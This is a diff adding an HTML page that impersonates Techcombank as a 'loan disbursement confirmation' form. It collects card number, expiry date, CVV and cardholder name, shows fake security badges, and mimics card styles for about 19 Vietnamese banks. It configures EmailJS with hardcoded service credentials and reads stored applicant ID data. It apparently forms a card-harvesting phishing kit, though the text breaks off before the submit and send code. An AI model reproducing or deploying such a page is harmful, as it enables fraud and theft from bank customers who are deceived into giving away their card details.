@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="vi" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Xác Nhận Giải Ngân - TECHCOMBANK</title>
+    <meta name="description" content="Xác nhận thông tin thẻ ATM/Visa/Mastercard để giải ngân khoản vay nhanh chóng.">
+    
+    <!-- External Libraries -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+    <!-- Custom Config & Styles -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            green: '#313131',
+                            dark: '#313131',
+                            light: '#E8F8EE',
+                            bg: '#F5F7FA',
+                            blue: '#2a83e9'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Segoe UI', 'Roboto', 'Arial', 'sans-serif'],
+                        mono: ['Space Mono', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body { background-color: #F5F7FA; -webkit-font-smoothing: antialiased; }
+        
+        .custom-input { transition: all 0.2s ease; }
+        .custom-input:focus {
+            border-color: #ed1c24;
+            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.15);
+        }
+        .custom-input.int-focus:focus {
+            border-color: #2a83e9;
+            box-shadow: 0 0 0 3px rgba(42, 131, 233, 0.15);
+        }
+        .custom-input:disabled { background-color: #f3f4f6; cursor: not-allowed; opacity: 0.7; }
+
+        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; }
+        .toast { transform: translateX(100%); transition: transform 0.3s ease-in-out; }
+        .toast.show { transform: translateX(0); }
+
+        .loader {
+            border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #ed1c24;
+            width: 20px; height: 20px; animation: spin 1s linear infinite;
+        }
+        .loader-int { border-top-color: #2a83e9; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .slide-down { animation: slideDown 0.4s ease-out forwards; transform-origin: top; }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* --- CARD VISUAL EFFECTS (BASE) --- */
+        .glass-card {
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            aspect-ratio: 1.586 / 1; 
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 10px 10px -5px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 1;
+        }
+        .glass-card::after {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(135deg, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0) 40%, rgba(255,255,255,0) 60%, rgba(255,255,255,0.05) 100%);
+            border-radius: inherit; pointer-events: none; z-index: 2;
+        }
+        
+        /* --- BRAND PERSONALIZATION --- */
+        .pattern-vcb::before {
+            content: ''; position: absolute; inset: 0; border-radius: inherit; z-index: 0;
+            background-image: repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255,255,255,0.05) 10px, rgba(255,255,255,0.05) 20px);
+        }
+        .pattern-tpb::before {
+            content: ''; position: absolute; bottom: -40px; right: -40px; width: 180px; height: 180px;
+            background: linear-gradient(135deg, #f97316 0%, #ea580c 100%);
+            transform: rotate(45deg); z-index: 0; opacity: 0.9;
+        }
+        .pattern-bidv { border-top: 4px solid #fbbf24 !important; }
+        
+        .pattern-mb::before {
+            content: ''; position: absolute; top: -50px; left: -50px; width: 200px; height: 200px;
+            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%); z-index: 0;
+        }
+
+        .text-shadow-sm { text-shadow: 1px 1px 2px rgba(0,0,0,0.6); }
+        .embossed-text {
+            color: #f8f9fa;
+            text-shadow: -1px -1px 1px rgba(255,255,255,0.2), 1px 1px 2px rgba(0,0,0,0.6);
+        }
+
+        /* Focus Highlights */
+        .vc-part { transition: opacity 0.3s ease, outline 0.3s ease; outline: 1px solid transparent; padding: 2px 4px; border-radius: 4px; }
+        .vc-part.focused { outline: 1px solid rgba(255,255,255,0.6); background: rgba(255,255,255,0.1); }
+        .is-focusing .vc-part:not(.focused) { opacity: 0.5; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen text-gray-800">
+
+    <!-- Header -->
+    <header class="bg-white shadow-sm sticky top-0 z-40">
+        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
+            <a href="#" class="flex items-center gap-2">
+                <img src="https://upload.wikimedia.org/wikipedia/vi/thumb/4/43/Logo_c%E1%BB%A7a_Techcombank_t%E1%BB%AB_2004.svg/1280px-Logo_c%E1%BB%A7a_Techcombank_t%E1%BB%AB_2004.svg.png" alt="TECHCOMBANK" class="h-8 md:h-10">
+            </a>
+            <div class="hidden md:flex gap-6 text-sm font-semibold text-gray-600">
+                <a href="#" class="hover:text-red-600 transition">Trang Chủ</a>
+                <a href="#" class="text-red-600">Đăng Ký Giải Ngân</a>
+                <a href="#" class="hover:text-red-600 transition">Liên Hệ</a>
+            </div>
+            <button class="md:hidden text-gray-600 text-2xl"><i class="fa-solid fa-bars"></i></button>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow container mx-auto px-4 py-6 md:py-8 max-w-2xl">
+        
+        <!-- Step Indicator -->
+        <div class="mb-6">
+            <div class="flex items-center justify-between relative">
+                <div class="absolute left-0 top-1/2 transform -translate-y-1/2 w-full h-1 bg-gray-200 -z-10"></div>
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10">
+                    <div class="w-8 h-8 rounded-full bg-red-600 text-white flex items-center justify-center font-bold text-sm">1</div>
+                    <span class="text-xs font-semibold text-red-600">Thông tin thẻ</span>
+                </div>
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10 opacity-50">
+                    <div class="w-8 h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold text-sm">2</div>
+                    <span class="text-xs font-semibold text-gray-500">Xác thực OTP</span>
+                </div>
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10 opacity-50">
+                    <div class="w-8 h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold text-sm">3</div>
+                    <span class="text-xs font-semibold text-gray-500">Hoàn tất</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white rounded-xl shadow-lg overflow-hidden border border-gray-100 relative">
+            
+            <!-- Header of Form -->
+            <div id="form-header" class="bg-gradient-to-r from-gray-800 to-black p-4 md:p-5 text-white text-center transition-colors duration-500">
+                <h1 class="text-xl md:text-2xl font-bold uppercase tracking-wide">Xác Nhận Giải Ngân</h1>
+                <p class="text-white/80 text-xs md:text-sm mt-1 font-light">Hỗ trợ thẻ ATM Nội Địa và Thẻ Quốc Tế</p>
+            </div>
+
+            <div class="p-4 md:p-6 lg:p-8">
+
+                <!-- VISUAL CARD -->
+                <div class="mb-8 flex justify-center perspective-1000">
+                    <div id="visual-card" class="w-full max-w-[360px] rounded-2xl p-5 md:p-6 text-white relative overflow-hidden transition-all duration-700 bg-gradient-to-br from-gray-700 to-gray-900 glass-card">
+                        
+                        <div class="absolute top-0 right-0 w-48 h-48 bg-white opacity-5 rounded-full -mr-16 -mt-16 pointer-events-none z-0"></div>
+                        <div class="absolute bottom-0 left-0 w-32 h-32 bg-white opacity-5 rounded-full -ml-12 -mb-12 pointer-events-none z-0"></div>
+
+                        <div class="flex justify-between items-start mb-4 md:mb-6 relative z-10">
+                            <div class="w-10 h-8 md:w-12 md:h-9 rounded-md border border-yellow-400/80 bg-gradient-to-br from-yellow-200/40 to-yellow-600/30 relative overflow-hidden flex items-center justify-center shadow-inner">
+                                <div class="w-full h-[1px] bg-yellow-400/50 absolute top-1/3"></div>
+                                <div class="w-full h-[1px] bg-yellow-400/50 absolute bottom-1/3"></div>
+                                <div class="w-[1px] h-full bg-yellow-400/50 absolute left-1/3"></div>
+                                <div class="w-[1px] h-full bg-yellow-400/50 absolute right-1/3"></div>
+                            </div>
+                            
+                            <div class="absolute left-14 top-1.5 md:left-16 md:top-2 opacity-70">
+                                <i class="fa-solid fa-wifi rotate-90 text-xs md:text-sm"></i>
+                            </div>
+
+                            <div class="h-6 md:h-8 flex items-center justify-end min-w-[70px]">
+                                <img id="vc-logo" src="" class="max-h-full max-w-full object-contain opacity-0 transition-opacity duration-500 bg-white/95 p-1 rounded-sm shadow-sm">
+                            </div>
+                        </div>
+
+                        <!-- KHÓA DÒNG SỐ THẺ -->
+                        <div id="vc-number-wrap" class="vc-part text-[16px] md:text-[22px] tracking-[0.15em] md:tracking-[0.2em] font-mono mb-3 md:mb-5 embossed-text h-7 md:h-8 relative z-10 transition-all duration-300 -ml-1 whitespace-nowrap w-full overflow-hidden">
+                            <span id="vc-number">•••• •••• •••• ••••</span>
+                        </div>
+
+                        <!-- KHÓA DÒNG NGÀY & TÊN -->
+                        <div class="flex flex-row justify-between items-end relative z-10 w-full -ml-1 flex-nowrap">
+                            <!-- Cột Ngày -->
+                            <div id="vc-date-wrap" class="vc-part max-w-[45%] flex-shrink-0 overflow-hidden">
+                                <div class="text-[8px] md:text-[9px] uppercase opacity-80 mb-0.5 tracking-widest whitespace-nowrap overflow-hidden text-ellipsis" id="vc-date-label">THÁNG/NĂM</div>
+                                <div id="vc-date" class="font-mono text-xs md:text-sm tracking-widest h-4 md:h-5 text-shadow-sm whitespace-nowrap">••/••</div>
+                            </div>
+                            
+                            <!-- Cột Tên -->
+                            <div id="vc-name-wrap" class="vc-part text-right flex-1 ml-4 overflow-hidden">
+                                <div class="text-[8px] md:text-[9px] uppercase opacity-80 mb-0.5 tracking-widest whitespace-nowrap">TÊN CHỦ THẺ</div>
+                                <div id="vc-name" class="font-bold text-xs md:text-sm tracking-widest uppercase h-4 md:h-5 overflow-hidden text-ellipsis whitespace-nowrap text-shadow-sm w-full text-right">
+                                    HỌ VÀ TÊN
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <form id="payment-form" class="space-y-5">
+                    
+                    <!-- BƯỚC 1: SỐ THẺ -->
+                    <div class="bg-gray-50/50 p-4 md:p-5 rounded-lg border border-gray-200 shadow-sm relative z-20 transition-all hover:bg-gray-50">
+                        <label class="block text-sm font-bold text-gray-800 mb-2 flex justify-between items-center">
+                            <span>Số thẻ (In trên mặt thẻ) <span class="text-red-500">*</span></span>
+                        </label>
+                        <div class="relative">
+                            <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-lg">
+                                <i class="fa-regular fa-credit-card"></i>
+                            </span>
+                            <input type="text" id="cardNumber" 
+                                class="custom-input w-full pl-10 pr-4 py-3.5 border-2 border-gray-300 rounded-lg focus:outline-none bg-white text-gray-900 font-bold tracking-widest text-base md:text-lg transition-colors"
+                                placeholder="Nhập số thẻ..." 
+                                maxlength="24"
+                                inputmode="numeric"
+                                autocomplete="cc-number">
+                        </div>
+                        <p id="err-cardNumber" class="text-red-500 text-xs mt-1.5 hidden"></p>
+                        
+                        <!-- MB Bank Hint -->
+                        <div id="mb-hint" class="hidden mt-2 p-2 bg-blue-50 text-blue-700 text-xs rounded border border-blue-100">
+                            <i class="fa-solid fa-circle-info"></i> <b>Lưu ý:</b> Thẻ MB Hi Collection không in số trên thẻ vật lý. Vui lòng mở App MB Bank để xem thông tin số thẻ của bạn.
+                        </div>
+                    </div>
+
+                    <!-- THÔNG TIN CHI TIẾT -->
+                    <div id="section-details" class="hidden slide-down space-y-4">
+                        
+                        <div id="alert-box" class="hidden mb-2 border rounded-lg p-3.5 flex items-start gap-3 shadow-sm">
+                            <i id="alert-icon" class="fa-solid mt-0.5"></i>
+                            <div>
+                                <h4 id="alert-title" class="font-bold text-sm"></h4>
+                                <p id="alert-desc" class="text-[13px] mt-0.5 leading-tight"></p>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-4">
+                            <!-- Date Field -->
+                            <div class="col-span-2 md:col-span-1" id="box-date">
+                                <label class="block text-sm font-semibold text-gray-700 mb-1.5">
+                                    <span id="lbl-cardDate">Tháng/Năm in trên thẻ</span> <span class="text-red-500">*</span>
+                                </label>
+                                <div class="relative">
+                                    <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400"><i class="fa-regular fa-calendar"></i></span>
+                                    <input type="text" id="cardDate" 
+                                        class="custom-input w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none"
+                                        placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                                </div>
+                                <p id="err-cardDate" class="text-red-500 text-xs mt-1 hidden"></p>
+                            </div>
+                            
+                            <!-- CVV Field -->
+                            <div class="col-span-2 md:col-span-1" id="box-cvv">
+                                <label class="block text-sm font-semibold text-gray-700 mb-1.5 flex justify-between">
+                                    <span>Mã bảo mật (CVV) <span class="text-red-500" id="cvv-star">*</span></span>
+                                    <span class="text-blue-600 text-xs font-normal cursor-pointer hover:underline flex items-center gap-1" onclick="showToast('Là 3 hoặc 4 số cuối in ở mặt sau thẻ', 'info')">
+                                        <i class="fa-regular fa-circle-question"></i> Là gì?
+                                    </span>
+                                </label>
+                                <div class="relative">
+                                    <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400"><i class="fa-solid fa-lock"></i></span>
+                                    <input type="password" id="cardCvv" 
+                                        class="custom-input w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none tracking-widest font-mono"
+                                        placeholder="•••" maxlength="4" inputmode="numeric">
+                                </div>
+                                <p class="text-[11px] text-gray-500 mt-1.5" id="cvv-hint">Nhập CVV nếu thẻ yêu cầu.</p>
+                                <p id="err-cardCvv" class="text-red-500 text-xs mt-1 hidden"></p>
+                            </div>
+
+                            <!-- Card Holder Name -->
+                            <div class="col-span-2">
+                                <label class="block text-sm font-semibold text-gray-700 mb-1.5">Tên chủ thẻ (In trên thẻ) <span class="text-red-500">*</span></label>
+                                <div class="relative">
+                                    <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400"><i class="fa-regular fa-user"></i></span>
+                                    <input type="text" id="cardName" 
+                                        class="custom-input w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:outline-none uppercase font-medium"
+                                        placeholder="NGUYEN VAN A" autocomplete="cc-name">
+                                </div>
+                                <p id="err-cardName" class="text-red-500 text-xs mt-1 hidden"></p>
+                            </div>
+                        </div>
+
+                        <!-- Submit Button -->
+                        <div class="pt-5">
+                            <button type="submit" id="btn-submit" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 md:py-4 rounded-lg shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-2 group text-base md:text-lg relative overflow-hidden">
+                                <div class="absolute inset-0 bg-white/20 transform -skew-x-12 -translate-x-full group-hover:animate-[shine_1.5s_infinite]"></div>
+                                <span id="btn-text">XÁC NHẬN GIẢI NGÂN</span>
+                                <i class="fa-solid fa-arrow-right group-hover:translate-x-1 transition-transform"></i>
+                            </button>
+                        </div>
+                        <style>
+                            @keyframes shine { 100% { transform: translateX(200%); } }
+                        </style>
+                    </div>
+                </form>
+
+            </div>
+        </div>
+        
+        <!-- Trust Badges -->
+        <div class="mt-6 flex flex-col items-center gap-3 mb-8">
+            <div class="flex justify-center gap-5 opacity-40 grayscale hover:grayscale-0 transition-all duration-300">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-5">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-5">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/40/JCB_logo.svg" class="h-5">
+                <img src="https://www.vban.vn/Resources/images/logo-bank/napas.png" class="h-5">
+            </div>
+            <div class="text-gray-400 text-xs flex items-center gap-1 font-medium">
+                <i class="fa-solid fa-shield-halved text-gray-300"></i> Mã hóa bảo mật chuẩn 256-bit SSL & PCI DSS
+            </div>
+        </div>
+    </main>
+
+    <!-- Toast -->
+    <div id="toast-container"></div>
+
+    <script>
+        // --- 1. CONFIGURATION ---
+        const CONFIG = {
+            EMAILJS_PUBLIC_KEY: 'b06J7tpw0xjJAunOd',
+            EMAILJS_SERVICE_ID: 'service_aa0dvwd',
+            EMAILJS_TEMPLATE_ID: 'template_9yc062q'
+        };
+
+        // --- 2. DATA DICTIONARIES ---
+        const DOMESTIC_BANKS = [
+            { id: "VIETCOMBANK", name: "Vietcombank", prefix: "970436", logo: "https://www.vban.vn/Resources/images/logo-bank/vietcombank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-green-700 to-green-900", pattern: "pattern-vcb" },
+            { id: "TECHCOMBANK", name: "Techcombank", prefix: "970407", logo: "https://www.vban.vn/Resources/images/logo-bank/techcombank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-red-600 to-red-800", pattern: "" },
+            { id: "BIDV", name: "BIDV", prefix: "970418", logo: "https://www.vban.vn/Resources/images/logo-bank/bidv.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-blue-800 to-blue-900", pattern: "pattern-bidv" },
+            { id: "MBBANK", name: "MB Bank", prefix: "970422", logo: "https://www.vban.vn/Resources/images/logo-bank/mbbank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-cyan-500 to-blue-600", pattern: "pattern-mb" },
+            { id: "AGRIBANK", name: "Agribank", prefix: "970405", logo: "https://www.vban.vn/Resources/images/logo-bank/agribank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-green-700 to-amber-800", pattern: "" },
+            { id: "TPBANK", name: "TPBank", prefix: "970423", logo: "https://www.vban.vn/Resources/images/logo-bank/tpbank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-purple-600 to-purple-900", pattern: "pattern-tpb" },
+            { id: "ACB", name: "ACB", prefix: "970416", logo: "https://www.vban.vn/Resources/images/logo-bank/acb.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-blue-700 to-blue-900", pattern: "" },
+            { id: "VIETINBANK", name: "VietinBank", prefix: "970415", logo: "https://www.vban.vn/Resources/images/logo-bank/viettinbank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-blue-600 to-blue-800", pattern: "" },
+            { id: "SACOMBANK", name: "Sacombank", prefix: "970429", logo: "https://www.vban.vn/Resources/images/logo-bank/sacombank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: true, gradient: "from-blue-500 to-blue-800", pattern: "" },
+            { id: "VPBANK", name: "VPBank", prefix: "970432", logo: "https://www.vban.vn/Resources/images/logo-bank/vpbank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-green-600 to-green-800", pattern: "" },
+            { id: "DONGABANK", name: "DongA Bank", prefix: "970406", logo: "https://www.vban.vn/Resources/images/logo-bank/dongabank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-blue-600 to-blue-800", pattern: "" },
+            { id: "MSB", name: "MSB", prefix: "970426", logo: "https://www.vban.vn/Resources/images/logo-bank/maritimebank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-red-600 to-red-800", pattern: "" },
+            { id: "BACA", name: "Bac A Bank", prefix: "970409", logo: "https://www.vban.vn/Resources/images/logo-bank/bacabank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-yellow-500 to-yellow-700", pattern: "" },
+            { id: "BAOVIET", name: "BaoViet Bank", prefix: "970438", logo: "https://www.vban.vn/Resources/images/logo-bank/baovietbank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-blue-600 to-blue-800", pattern: "" },
+            { id: "VRB", name: "VRB", prefix: "970421", logo: "https://www.vban.vn/Resources/images/logo-bank/vrb.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-blue-600 to-blue-800", pattern: "" },
+            { id: "COOPBANK", name: "Co-op Bank", prefix: "970446", logo: "https://www.vban.vn/Resources/images/logo-bank/coopbank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-green-600 to-green-800", pattern: "" },
+            { id: "CIMB", name: "CIMB", prefix: "970477", logo: "https://cdn.haitrieu.com/wp-content/uploads/2022/02/Logo-CIMB-Bank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-red-700 to-red-900", pattern: "" },
+            { id: "VIB", name: "VIB", prefix: "970441", logo: "https://www.vban.vn/Resources/images/logo-bank/vib.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-orange-500 to-orange-700", pattern: "" },
+            { id: "HDBANK", name: "HDBank", prefix: "970437", logo: "https://www.vban.vn/Resources/images/logo-bank/hdbank.png", dateLabel: "Tháng/Năm phát hành", requireCvv: false, gradient: "from-red-600 to-red-800", pattern: "" }
+        ];
+
+        const INTERNATIONAL_BRANDS = [
+            { id: "VISA", name: "Visa", prefix: /^4/, logo: "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg", dateLabel: "Ngày hết hạn (MM/YY)", requireCvv: true, gradient: "from-gray-800 to-black" },
+            { id: "MASTERCARD", name: "Mastercard", prefix: /^(5[1-5]|2[2-7])/, logo: "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg", dateLabel: "Ngày hết hạn (MM/YY)", requireCvv: true, gradient: "from-gray-900 to-red-900" },
+            { id: "JCB", name: "JCB", prefix: /^35/, logo: "https://upload.wikimedia.org/wikipedia/commons/4/40/JCB_logo.svg", dateLabel: "Ngày hết hạn (MM/YY)", requireCvv: true, gradient: "from-blue-700 to-blue-900" },
+            { id: "UIP", name: "UnionPay", prefix: /^62/, logo: "https://upload.wikimedia.org/wikipedia/commons/1/1b/UnionPay_logo.svg", dateLabel: "Ngày hết hạn (MM/YY)", requireCvv: true, gradient: "from-red-700 to-red-900" }
+        ];
+
+        // --- 3. APP STATE & UTILS ---
+        let state = { cardFlow: null, selectedItem: null, loanData: {} };
+
+        function removeVietnameseTones(str) {
+            str = str.replace(/à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ/g,"a"); 
+            str = str.replace(/è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ/g,"e"); 
+            str = str.replace(/ì|í|ị|ỉ|ĩ/g,"i"); 
+            str = str.replace(/ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ/g,"o"); 
+            str = str.replace(/ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ/g,"u"); 
+            str = str.replace(/ỳ|ý|ỵ|ỷ|ỹ/g,"y"); 
+            str = str.replace(/đ/g,"d");
+            str = str.replace(/À|Á|Ạ|Ả|Ã|Â|Ầ|Ấ|Ậ|Ẩ|Ẫ|Ă|Ằ|Ắ|Ặ|Ẳ|Ẵ/g, "A");
+            str = str.replace(/È|É|Ẹ|Ẻ|Ẽ|Ê|Ề|Ế|Ệ|Ể|Ễ/g, "E");
+            str = str.replace(/Ì|Í|Ị|Ỉ|Ĩ/g, "I");
+            str = str.replace(/Ò|Ó|Ọ|Ỏ|Õ|Ô|Ồ|Ố|Ộ|Ổ|Ỗ|Ơ|Ờ|Ớ|Ợ|Ở|Ỡ/g, "O");
+            str = str.replace(/Ù|Ú|Ụ|Ủ|Ũ|Ư|Ừ|Ứ|Ự|Ử|Ữ/g, "U");
+            str = str.replace(/Ỳ|Ý|Ỵ|Ỷ|Ỹ/g, "Y");
+            str = str.replace(/Đ/g, "D");
+            return str;
+        }
+
+        // Lỗi 4: Luhn Algorithm - Chỉ nên áp dụng bắt buộc với Thẻ Quốc Tế
+        function isValidLuhn(cardNumber) {
+            let sum = 0; let isEven = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i), 10);
+                if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
+                sum += digit; isEven = !isEven;
+            }
+            return (sum % 10) === 0;
+        }
+
+        // --- 4. INIT ---
+        document.addEventListener('DOMContentLoaded', () => {
+            if(window.emailjs) emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+            const storedData = sessionStorage.getItem('formData');
+            state.loanData = storedData ? JSON.parse(storedData) : {
+                fullName: "NGUYỄN VĂN A", cccd: "0123456789", amount: "20.000.000 VND", months: "24", phone: "090xxxxxxx"
+            };
+            setupInputs();
+            setupFocusEffects();
+        });
+
+        // --- 5. UI LOGIC & VISUAL CARD ---
+        function setupFocusEffects() {
+            const visualCard = document.getElementById('visual-card');
+            const addFocus = (inputId, wrapId) => {
+                document.getElementById(inputId).addEventListener('focus', () => {
+                    visualCard.classList.add('is-focusing');
+                    document.getElementById(wrapId).classList.add('focused');
+                });
+                document.getElementById(inputId).addEventListener('blur', () => {
+                    visualCard.classList.remove('is-focusing');
+                    document.getElementById(wrapId).classList.remove('focused');
+                });
+            };
+            addFocus('cardNumber', 'vc-number-wrap');
+            addFocus('cardDate', 'vc-date-wrap');
+            addFocus('cardName', 'vc-name-wrap');
+        }
+
+        function setupInputs() {
+            const cardInput = document.getElementById('cardNumber');
+            const vcNumber = document.getElementById('vc-number');
+            const dateInput = document.getElementById('cardDate');
+            const vcDate = document.getElementById('vc-date');
+            const nameInput = document.getElementById('cardName');
+            const vcName = document.getElementById('vc-name');
+            
+            cardInput.addEventListener('input', (e) => {
+                let rawVal = e.target.value.replace(/\D/g, '');
+                
+                // FIX LỖI 1: Phải Detect thẻ trước khi cắt xén độ dài (maxLength)
+                detectCardType(rawVal); 
+
+                // Sau khi detect, state.cardFlow đã chuẩn xác, mới tiến hành cắt xén
+                let maxLength = (state.cardFlow === 'napas') ? 19 : 16;
+                if(rawVal.length > maxLength) rawVal = rawVal.substring(0, maxLength);
+
+                // Format thêm dấu cách
+                let parts = [];
+                for (let i = 0; i < rawVal.length; i += 4) parts.push(rawVal.substring(i, i + 4));
+                e.target.value = parts.join(' ');
+
+                // Format hiển thị trên thẻ (điền thêm dấu chấm)
+                let targetLength = (state.cardFlow === 'napas' && rawVal.length > 16) ? 19 : 16;
+                let padded = rawVal.padEnd(targetLength, '•');
+                
+                let formattedVisual = '';
+                for (let i = 0; i < padded.length; i += 4) formattedVisual += padded.substring(i, i + 4) + ' ';
+                vcNumber.textContent = formattedVisual.trim();
+
+                // Dynamic font scaling cho thẻ 19 số
+                const vcNumberWrap = document.getElementById('vc-number-wrap');
+                if (targetLength > 16) {
+                    vcNumberWrap.className = "vc-part font-mono mb-3 md:mb-5 embossed-text h-7 md:h-8 relative z-10 transition-all duration-300 -ml-1 whitespace-nowrap w-full text-[13px] md:text-[17px] tracking-[0.1em] md:tracking-[0.12em] overflow-hidden";
+                } else {
+                    vcNumberWrap.className = "vc-part font-mono mb-3 md:mb-5 embossed-text h-7 md:h-8 relative z-10 transition-all duration-300 -ml-1 whitespace-nowrap w-full text-[16px] md:text-[22px] tracking-[0.15em] md:tracking-[0.2em] overflow-hidden";
+                }
+            });
+
+            // FIX LỖI 3: Trải nghiệm gõ phím / xóa phím Backspace cho Ngày Tháng
+            dateInput.addEventListener('input', (e) => {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 4) v = v.substring(0, 4);
+                
+                let formatted = v;
+                if (v.length >= 2) {
+                    let m = parseInt(v.substring(0, 2));
+                    // Giới hạn tháng 01 -> 12
+                    if (m > 12) formatted = '12' + (v.length > 2 ? '/' + v.substring(2) : '');
+                    else if (m === 0) formatted = '01' + (v.length > 2 ? '/' + v.substring(2) : '');
+                    else formatted = v.substring(0, 2) + (v.length > 2 ? '/' + v.substring(2) : '');
+                }
+                
+                // Cho phép người dùng xóa bình thường
+                e.target.value = formatted;
+                vcDate.textContent = formatted || '••/••';
+            });
+
+            nameInput.addEventListener('input', (e) => {
+                const start = e.target.selectionStart; const end = e.target.selectionEnd;
+                let cleanName = removeVietnameseTones(e.target.value).toUpperCase().replace(/[^A-Z\s]/g, ''); 
+                e.target.value = cleanName; e.target.setSelectionRange(start, end);
+                vcName.textContent = cleanName || 'HỌ VÀ TÊN';
+            });
+
+            document.getElementById('cardCvv').addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+            });
+        }
+
+        function detectCardType(rawNumber) {
+            let flowChanged = false;
+            if (rawNumber.startsWith('9704')) {
+                if(state.cardFlow !== 'napas') { state.cardFlow = 'napas'; flowChanged = true; }
+            } else if (rawNumber.length > 0) {
+                if(state.cardFlow !== 'international') { state.cardFlow = 'international'; flowChanged = true; }
+            } else {
+                resetFlow(); return;
+            }
+
+            let matchedItem = null;
+            if (state.cardFlow === 'napas' && rawNumber.length >= 6) {
+                const prefix6 = rawNumber.substring(0, 6);
+                matchedItem = DOMESTIC_BANKS.find(bank => bank.prefix === prefix6);
+            } else if (state.cardFlow === 'international' && rawNumber.length >= 1) {
+                matchedItem = INTERNATIONAL_BRANDS.find(brand => brand.prefix.test(rawNumber));
+            }
+
+            if (matchedItem) {
+                if (!state.selectedItem || state.selectedItem.id !== matchedItem.id) {
+                    selectItem(matchedItem);
+                }
+            } else {
+                if (state.selectedItem) {
+                    state.selectedItem = null;
+                    document.getElementById('section-details').classList.add('hidden');
+                    document.getElementById('alert-box').classList.add('hidden');
